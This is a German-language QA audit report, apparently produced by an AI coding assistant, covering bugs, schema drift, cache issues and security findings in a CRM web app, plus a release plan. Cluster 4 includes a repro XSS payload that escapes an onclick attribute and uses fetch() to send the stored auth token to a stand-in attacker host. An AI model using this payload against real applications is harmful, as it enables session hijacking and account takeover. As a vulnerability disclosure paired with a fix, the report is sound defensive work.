# QA-Sweep — Konsolidierter Master-Bericht

**Datum:** 28.05.2026
**Codebase-Stand:** `main`, v2.32.13
**Sweep-Methodik:** 5 statische Code-Audits (A.1–A.4 + C) + 1 Live-Daten-Audit (B) parallel, jeweils thematisch fokussiert. Phase D (manuelles Klick-Drehbuch) liegt für dich bereit, läuft separat.

---

## ✅ FINALISIERUNGS-STATUS (Stand 03.06.2026, v2.33.18)

Der QA-Sweep ist abgearbeitet. Releases **v2.33.0 – v2.33.18** haben umgesetzt:

- **Alle Critical-Findings** (Cluster 1–12) — geschlossen.
- **Alle High-Findings** — geschlossen (inkl. A.1 #6 Projekt-Wechsel-Auto-Status, A.4 #15 Termin-Duplikat-Race, A.2 #8 Last-Admin).
- **Alle Medium-Findings** — geschlossen (Termin-Status DB-getrieben A.1 #4/#14/#24, A.4 #21 Entitlement-Verfall, C #6 Seed-Datei mit system_keys, Schema-Drift C #1/#3/#4/#5).
- **Alle user-sichtbaren Low-Findings** — geschlossen (Status-Anzeige-Labels A.1 #7/#8/#9, Termin-Farben A.1 #16, A.1 #5 Quick-Status-Termin-Sync, Aufgaben-`storniert` A.1 #10, alle Status-Labels Title-Case-harmonisiert).
- **Phase B (Live-Daten)** — komplett aufgeräumt: Label-Status geheilt (#1), dateless ifm-Test-Einsätze + Test-Projekt soft-gelöscht (#2, v2.33.14/15), verwaister Einsatz + „ALT!"-Projekt (#4/#5/#6). **B #3 (Mitgliedschaftspreise=0) ist bestätigt Absicht** (externe Abrechnung, reines Tracking).

**Bewusst NICHT umgesetzt (kein Blocker für Testphase):**
- **Interner Konstanten-Sweep** (~13 Low, A.1 #15/#25/#28/#29 etc.): hartcodierte Status-Strings → Konstanten-Maps. **Kein User-Impact**, reines Code-Smell; gehört in den späteren `app.js`-Modul-Split (Regressionsrisiko ohne Nutzen, daher nicht kurz vor der Testphase).
- **Phase D** (`qa/test-script.md`): manuelles Klick-Drehbuch — das ist jetzt **dein** Teil der Testphase.

➡️ **Bereit für die Testphase.** Phase D ist der nächste Schritt.

---

## Bestandsaufnahme

| Phase | Fokus | Findings | davon Critical | davon High | Datei |
|---|---|---:|---:|---:|---|
| A.1 | Status & Auto-Status-Logik | 35 | 6 | 10 | `findings-status.md` |
| A.2 | Crashes & Null-Handling | 24 | 3 | 6 | `findings-crashes.md` |
| A.3 | XSS & Sicherheit | 19 | 0 | 4 | `findings-xss.md` |
| A.4 | Cache & Cross-Entity-Refresh | 32 | 6 | 10 | `findings-cache.md` |
| B | Live-Daten-Audit (Produktion) | 11 | 0 | 3 | `findings-data.md` |
| C | Schema-vs-Code | 22 | 4 | 3 | `findings-schema.md` |
| **Σ** | | **~143** | **19** | **36** | |

Phase D (manuelles Klick-Drehbuch) ergänzt diese Liste, sobald du das Drehbuch durchgearbeitet hast.

**Live-DB-Zustand:** 251 aktive Firmen, 258 Kontakte, 24 Einsätze, 12 Projekte, 5 Mitgliedschaften, 6 Aufgaben. Keine kritischen Datenkorruptionen — aber **2 Projekte mit Label-Status statt system_keys**, **2 Einsätze „durchgeführt" ohne Datum**, **1 Einsatz auf soft-gelöschtem Projekt**, **1 Müll-Projekt „AWT-Training P2 - ALT!"**. Details in `findings-data.md`.

---

## Top-Cluster (de-dupliziert über Phasen)

Mehrere Phasen haben unabhängig denselben Bug aus verschiedenen Blickwinkeln gefunden. Die folgenden Cluster sind sortiert nach **Hebel pro Aufwand** — Fixe oben zuerst.

### Cluster 1 — Status-Picker schreibt Labels statt system_keys (BLOCKER)

**Phasen:** A.1 #1 · A.4 #1 · B #1 (Daten-Folge) · A.1 #2 + A.4 #2 (fehlende Auto-Status-Trigger)
**Dateien:** `app.js:25647`, `:25672–25686`, `:25725–25727`, `:25613`, `:25707`

**Was passiert:** `_loadStatusOptions` lädt `lookup_values` ohne `system_key`. Der Status-Picker schreibt `o.wert` (Label) in die DB statt des system_keys. Folgen:

1. Beim Setzen via Pille landet z. B. `'Abgeschlossen'` in `projects.status` — das ist genau, was Phase B in der **Live-DB gemessen hat** (2 betroffene Projekte: `94f4a3ab…`, `1d4fe69a…`).
2. Die Auto-Projekt-Status-Logik vergleicht gegen system_keys → matcht nicht → Projekt hängt im falschen Status.
3. Filter im Listing finden den Datensatz nicht mehr.
4. Bei nächstem Modal-Öffnen kein Status-Match → Default-Sprung auf ersten Wert.

Der Bug ist **explizit im Code-Kommentar bei Z. 25723–25724 dokumentiert** („…der Picker übergibt aktuell o.wert, also Label").

**Fix-Aufwand:** S (1–2 h). Plus Migration `v2.32.14_project_status_keyfix.sql`, um die 2 verdorbenen Projekte zu korrigieren.

---

### Cluster 2 — Title-Case-Status-Filter `(Storniert)`, `(Abgeschlossen,Storniert,Verloren)` etc. (BLOCKER)

**Phasen:** A.2 #2 · C #2 (gleicher Befund, 2 Perspektiven)
**Dateien:** `app.js:4746` (Briefing „heiße Projekte"), `app.js:5432` (Arbeitsplatz-KPI „Heute Einsätze"), `app.js:5794` (Aside „ungeplante Einsätze")

Drei `.not('status', 'in', '(Title-Case,…)')`-Filter sind seit v2.31 **wirkungslos**. KPIs zählen falsch (stornierte Einsätze als „heute aktiv"), abgeschlossene Projekte erscheinen als „hot", abgerechnete Einsätze tauchen in „ungeplant" auf.

**Fix-Aufwand:** S (10 Min). 3 einzeilige Edits — entweder auf system_keys umstellen oder mit `DEPLOYMENT_STATUS.STORNIERT` parametrisieren.

---

### Cluster 3 — Schema-Drift: Code referenziert Spalten, die nicht existieren (BLOCKER)

**Phase:** C #1, #3, #4, #5

| # | Stelle | Spalte | Folge |
|---|---|---|---|
| C #1 | `app.js:32031` (Bündel-Composer Bulk-Insert) | `deployments.ganztag` | **Bündel-Anlage ist effektiv kaputt** — jeder Multi-Tage-Versuch crasht, das vorab angelegte Bundle wird rollback-gelöscht. |
| C #3 | `app.js:8434` + `9435` (Theme-Modal Owner-Dropdown, Template-User-Felder) | `user_profiles.ist_aktiv` (gibt's nicht, heißt `status`) | Dropdowns bleiben leer. |
| C #4 | `app.js:6508` (Termin-Detail Activity-Stream) | `tasks.appointment_id` (existiert nicht; Kopplung ist umgekehrt via `appointments.task_id`) | Aufgaben werden nie im Termin angezeigt. |
| C #5 | `app.js:4744`, `4754–4755`, `23355` (Briefing) | `projects.updated_at` (existiert nicht) | Briefing-Block „heiße Projekte" fällt silent aus. |

**Fix-Aufwand:** S–M (1 h gesamt). Alle vier sind kleine Code-Edits.

---

### Cluster 4 — XSS via esc()-Bypass in `onclick`-Attributen (BLOCKER, Sicherheit)

**Phase:** A.3 #1, #2, #3, #4

| # | Stelle | Vektor | Wer kann triggern |
|---|---|---|---|
| A.3 #1 | `app.js:7580` — User-Tabelle „Passwort zurücksetzen" | `user_profiles.name` in JS-String-Literal in `onclick` | Admin via Self-Service-Pfad oder kompromittierter Admin |
| A.3 #2 | `app.js:25681` — **Status-Pillen-Popup in JEDER Liste** | `lookup_values.wert` in `onclick` — Stored XSS gegen alle authenticated User | Admin via Lookup-Wert; **evtl. auch Non-Admin** falls RLS fehlt (#12) |
| A.3 #3 | `app.js:25357` — Themen-Suggestion im Composer | `project_themes.name` — von beliebigem User anlegbar | jeder User |
| A.3 #4 | `app.js:27212/27272/27168` — Shortcut-URLs | `javascript:`-URI in `href`, läuft im Origin von cumart.cloud | Admin |

**Mechanismus:** Browser dekodiert HTML-Entities in Attribut-Werten **vor** dem JS-Parser. `esc()` ersetzt `'` mit `&#39;` → wird zurück zu `'` → bricht das String-Literal → JS-Injection.

**Repro-Payload (#1):**
```
Bob');fetch('//attacker.test?t='+localStorage.getItem('sb-loohjeiysjxzbmfwkyvv-auth-token'));//
```

**Fix-Aufwand:** M (halber Tag). Alle vier Stellen auf `data-*`-Attribute + Event-Delegation umstellen. Plus URL-Scheme-Whitelist in `saveShortcut`.

---

### Cluster 5 — RLS-Verifikation: ist `lookup_values` wirklich Admin-Write-only? (Sicherheit)

**Phase:** A.3 #12

Im Repo gibt es **keine Migration**, die das in CLAUDE.md behauptete „strikte Admin-Write" auf `lookup_values`, `services`, `templates`, `shortcuts`, `roles` als RLS-Policy umsetzt. Wenn die Policy nur Client-Side ist, kann ein Non-Admin via DevTools direkt `.from('lookup_values').insert(...)` machen — **und damit Cluster 4 #2 ohne Admin-Konto auslösen**.

**Verifikation (read-only, mit dem PAT machbar):**
```sql
SELECT tablename, policyname, cmd, qual FROM pg_policies
 WHERE tablename IN ('lookup_values','services','templates','shortcuts','roles');
```

**Fix-Aufwand:** S (verifizieren) + S–M (Policy-Migration nachreichen falls fehlend).

---

### Cluster 6 — `_performSoftDelete` ist „dümmer" als die Modal-Delete-Pfade

**Phase:** A.4 #3, #4, #5 + Folgespuren in B #4

Der zentrale Listen-Kebab-Delete-Dispatcher (`app.js:3202–3249`) macht weniger als die Modal-Delete-Funktionen:

- **#3** Beim Löschen eines Einsatzes via Liste: `entitlement_redemptions` werden **nicht** mitgelöscht → Bonus bleibt verbraucht, Einsatz weg. Mitgliedschafts-Bilanz inkonsistent.
- **#4** Kein `checkAndUpdateProjectStatus` nach Listen-Delete → Projekt hängt im falschen Status.
- **#5** Beim Löschen einer Aufgabe: gekoppelter Termin (`appointments.task_id`) wird **nicht** mitgelöscht → Geister-Termine im Kalender.
- **B #4** Beim Soft-Delete eines Projekts kaskadiert nichts auf die Einsätze → Live-DB hat genau diesen Fall: Einsatz `81319be2` auf soft-deleted „Testprojekt v3".

**Fix-Aufwand:** S–M (2–4 h). Ein zentraler Dispatcher-Patch lässt alle drei Befunde verschwinden.

---

### Cluster 7 — Mitgliedschaft-Soft-Delete erzeugt Phantom-Bonis

**Phase:** A.4 #6

`deleteMembership` soft-löscht nur die Mitgliedschaft. `refreshRedeemSection` filtert Entitlements aber **nicht** nach `memberships.deleted_at IS NULL`. Bonis einer „gelöschten" Mitgliedschaft erscheinen weiter im Einlöse-Dropdown und sind buchbar — Bilanz-Bruch.

**Fix-Aufwand:** S (1 h).

---

### Cluster 8 — Cache-Invalidierung: `programsCache`, Lookup-Caches, weitere

**Phase:** A.4 #7, #8, #9, #10, #11, #12, #13, #17, #18

- `saveProgram` / `deleteProgram` invalidiert `programsCache` nicht → bei direkt anschließender Mitgliedschafts-Anlage werden alte Benefits in Entitlements eingefroren.
- `saveLookup` / `deleteLookup` invalidiert **keinen** der 6 Lookup-Caches → Status-Farben, Dropdown-Optionen, Default-Termintyp zeigen alten Stand bis F5.
- `companiesCache`, `contactsCache`, `companyContactsMap`, `companyAppointmentMap`, `servicesCache`, `userProfilesCache` haben jeweils mindestens einen Write-Pfad, der vergisst zu invalidieren.

`themesCacheByProject` ist das **positive Referenz-Muster** (dedizierter `invalidateThemesCache`-Helper an jedem Schreibpfad).

**Fix-Aufwand:** M (1 Tag). Pro Cache einen `invalidate<X>Cache`-Helper einführen, an allen Schreibpfaden aufrufen.

---

### Cluster 9 — Edge Function `manage-users`: Last-Admin-Schutz hat zwei Löcher

**Phase:** A.2 #8, #9

- **#8** `isUserAdmin` prüft nicht `status='aktiv'` → inaktive Admins werden als „letzter Admin" gezählt und blockieren legitime Löschungen.
- **#9** `status='inaktiv'`-Updates laufen direkt über `db.from('user_profiles').update(...)`, **nicht** über die Edge Function. Der einzige aktive Admin kann sich selbst auf `inaktiv` setzen → **kompletter App-Lockout, kein Login mehr möglich**.

**Fix-Aufwand:** M (halber Tag). Edge Function erweitern + DB-Trigger gegen Self-Deactivation. Sicherheitsrelevant.

---

### Cluster 10 — Datum-Bugs an DST-Übergängen / nahe Mitternacht

**Phase:** A.2 #6, #7

- `new Date(d.datum_von)` ohne `parseLocalDate`-Helper → Kalender-Off-by-one am DST-Tag (29.03.2026, 31.10.2026).
- `new Date().toISOString().slice(0,10)` → Vortag-Datum kurz nach Mitternacht in Berlin-Sommerzeit (z. B. Mitgliedschaft-Default-Startdatum).

**Fix-Aufwand:** S (1 h). `parseLocalDate` / `toISODate` durchgängig nutzen.

---

### Cluster 11 — Auto-Projekt-Status: weitere Trigger-Lücken & Storniert-Behandlung

**Phase:** A.1 #2, #3, #5 · A.4 #4, #16 · A.2 #15

- `selectEntityStatus` / `advanceEntityStatus` (Status-Picker) triggert kein Recompute (siehe Cluster 1).
- `_performSoftDelete` triggert nicht (siehe Cluster 6).
- Bundle-Save/-Delete triggert nicht (A.4 #16).
- Quick-Toggles `toggleDeploymentDone` / `markDeploymentDone` und Friends syncen den gekoppelten Termin **nicht** (A.1 #5).
- **`checkAndUpdateProjectStatus` zählt stornierte Einsätze als „nicht erledigt"** (A.2 #15) → Projekt mit 3 durchgeführten + 1 stornierten Einsatz bleibt in „In Arbeit" hängen statt nach „Abschlussphase" zu gehen.

**Fix-Aufwand:** M (4–6 h). Ein Pass über alle Status-mutierenden Pfade.

---

### Cluster 12 — Live-Daten-Drift (vorhandene Inkonsistenzen putzen)

**Phase:** B

| Befund | Aktion |
|---|---|
| B #1 — 2 Projekte mit Label-Status (`'Abgeschlossen'`, `'Abschlussphase'`) | Migration `v2.32.14_project_status_keyfix.sql` |
| B #2 — 2 Einsätze `durchgefuehrt` ohne Datum (ifm GmbH: `89d48f67`, `d09631c5`) | Manuell mit dir klären, Datum nachpflegen |
| B #4 — Einsatz `81319be2` auf soft-deleted Projekt | Soft-Delete des Einsatzes |
| B #5, #6 — Projekt `4d2a6400` „AWT-Training P2 - ALT!" Müll-Datensatz | Soft-Delete |
| B #3 — alle 5 Mitgliedschaften `preis=0` | Klären: Absicht oder Datenlücke? |

**Aufwand:** S (1 h). Eine Migration + manuelles Aufräumen.

---

## Severity × Aufwand-Matrix

```
            S (≤ 2h)         M (½–1 Tag)      L (Tage)
Critical    Cluster 2, 12    Cluster 1, 3, 9  —
            Cluster 7
High        Cluster 10       Cluster 4, 6, 11 Cluster 8
            Cluster 5 (Verif.)                Cluster 5 (RLS-Migr.)
Medium      ~15 Einzelfunde  ~12 Einzelfunde  XSS-Defense-in-Depth
                                              (data-*-Migration global)
Low/Info    ~40 Einzelfunde
```

**Top-7 Hebel für maximalen Wert:**
1. Cluster 2 (Filter-Strings) — 10 Min
2. Cluster 3 (Schema-Drift Spalten) — 1 h
3. Cluster 12 (Daten-Aufräumen) — 1 h
4. Cluster 1 (Status-Picker → system_keys) — 1–2 h
5. Cluster 7 (Phantom-Bonis) — 1 h
6. Cluster 4 (XSS-Härtung) — halber Tag
7. Cluster 6 (`_performSoftDelete`) — 2–4 h

**Summe: ~1,5 Arbeitstage** für die schwersten Treffer.

---

## Empfohlene Release-Reihenfolge

### v2.33.0 — Sicherheits- & Status-Härtung (sofort)
- Cluster 4 (XSS #1–#4)
- Cluster 1 (Status-Picker)
- Cluster 2 (Filter-Strings)
- Cluster 12 (Migration `v2.32.14_project_status_keyfix.sql` + Live-Aufräumen)
- Cluster 5 (RLS-Verifikation und ggf. Policy-Migration)
- Cluster 9 (Edge-Function Last-Admin)

### v2.33.1 — Cross-Entity-Konsistenz
- Cluster 6 (`_performSoftDelete`-Patch)
- Cluster 7 (Mitgliedschaft-Soft-Delete)
- Cluster 11 (Auto-Status-Lücken, Storniert)

### v2.33.2 — Schema-Drift & Datum
- Cluster 3 (Spalten-Drift)
- Cluster 10 (Datum-Bugs)
- A.2 #1 (saveDeployment Doppelklick-Race)
- A.2 #4 (Inline-Doku-Race)

### v2.33.3 — Cache-Sanierung
- Cluster 8 (alle Caches mit dediziertem `invalidate*`-Helper)

### v2.33.4 — Aufräumen
- Restliche Medium-Findings aller Phasen
- Lookup `TASK_STATUS.STORNIERT` ergänzen oder Konstante entfernen
- `restore_stammdaten.sql` mit system_keys ergänzen
- `notes` Init-Schema dokumentieren

### Mittelfristig
- XSS-Defense-in-Depth: alle Inline-`onclick` auf `data-*` + Delegation migrieren → erlaubt Nonce-CSP (Cluster 4 Info #14)
- BroadcastChannel für Multi-Tab-Sync (A.4 #22)
- pg_trgm-Indexe für Suche (vor FiveAx)

---

## Was du jetzt tun kannst

1. **Phase D abarbeiten** (`qa/test-script.md`) — etwa 3–4 h Klick-Arbeit, deckt Bereiche ab, die statisch nicht erfasst werden (UI-Flows, Mobile, Berichte). Schreib deine Notizen mit Severity-Markern direkt in die Datei. Wenn du fertig bist, gibst du sie mir, ich ergänze sie hier im Master.
2. **PAT widerrufen** — Supabase Dashboard → Account → Tokens → `claude-qa-sweep` löschen. Live-Audit ist durch, brauche ihn nicht mehr.
3. **Mit v2.33.0 starten** — die Top-7-Hebel oben sind ~1,5 Tage Arbeit und schalten die größten Risiken aus. Sag, womit ich anfangen soll (Cluster 2 ist der billigste Quick-Win).
4. **Müll-Aufräumen entscheiden:** Phase B hat das „ALT!"-Projekt und den verwaisten Einsatz identifiziert. Soll ich diese Soft-Deletes als Migration vorbereiten?

---

## Findings-Index

- `findings-status.md` — Phase A.1 (Status & Auto-Status)
- `findings-crashes.md` — Phase A.2 (Crashes, Nulls, Edge Function)
- `findings-xss.md` — Phase A.3 (XSS & Sicherheit)
- `findings-cache.md` — Phase A.4 (Cache, Refresh, Cross-Entity)
- `findings-data.md` — Phase B (Live-Daten-Audit)
- `findings-schema.md` — Phase C (Schema-vs-Code)
- `test-script.md` — Phase D (manuelles Klick-Drehbuch zum Abarbeiten)
- `findings-master.md` — dieses Dokument
